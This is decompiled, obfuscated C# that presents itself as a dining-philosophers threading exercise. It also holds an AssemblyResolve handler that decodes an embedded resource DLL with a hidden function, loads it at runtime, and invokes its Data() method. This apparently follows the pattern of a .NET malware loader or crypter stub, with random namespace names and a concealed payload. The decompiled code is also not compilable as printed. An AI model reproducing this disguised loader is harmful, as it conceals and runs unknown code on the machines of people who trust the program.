using System;
using System.IO;
using System.Reflection;
using System.Threading;
using Yrbvzqqgpldz;

namespace Hbisjtsryhowltszkcgwhxxu;

internal sealed class e
{
	private sealed class a
	{
		public string a;

		internal bool a(string a)
		{
			return a.EndsWith(this.a);
		}
	}

	private bool[] m_a;

	private int m_b;

	private int m_c;

	private int m_d;

	private int m_e;

	private char f = 'T';

	public e(bool[] a, int b)
	{
		this.m_a = a;
		this.m_b = b;
		this.m_c = this.m_b;
		this.m_d = (this.m_b + 1) % 5;
		Console.WriteLine("Filosof {0}, left fork: {1}, right fork: {2}", b, this.m_c.ToString(), this.m_d.ToString());
	}

	public void a()
	{
		this.b();
	}

	private void b()
	{
		AppDomain.CurrentDomain.AssemblyResolve += a;
	}

	public void c()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		new ClassLibrary().Data();
	}

	public void d()
	{
		Random random = new Random();
		while (true)
		{
			Thread.Sleep(random.Next(1000, 5000));
			f = 'V';
			lock (this.m_a)
			{
				while (this.m_a[this.m_d] || this.m_a[this.m_c])
				{
					Monitor.Wait(this.m_a);
				}
				this.m_a[this.m_d] = true;
				this.m_a[this.m_c] = true;
				f = 'S';
				m_e++;
				Monitor.PulseAll(this.m_a);
			}
			Thread.Sleep(random.Next(1000, 5000));
			lock (this.m_a)
			{
				if (!this.m_a[this.m_d] || !this.m_a[this.m_c])
				{
					throw new InvalidOperationException("What the fuck!");
				}
				this.m_a[this.m_d] = false;
				this.m_a[this.m_c] = false;
				Monitor.PulseAll(this.m_a);
			}
			f = 'T';
		}
	}

	internal char a()
	{
		return f;
	}

	internal int a()
	{
		return m_e;
	}

	internal int b()
	{
		return this.m_b;
	}

	private Assembly a(object a, ResolveEventArgs b)
	{
		a a2 = new a();
		a2.a = "Hbisjtsryhowltszkcgwhxxu.Yrbvzqqgpldz.dll";
		string name = Array.Find(GetType().Assembly.GetManifestResourceNames(), a2.a);
		using Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
		byte[] array = new byte[stream.Length];
		stream.Read(array, 0, array.Length);
		return AppDomain.CurrentDomain.Load(Hbisjtsryhowltszkcgwhxxu.d.b(array));
	}
}
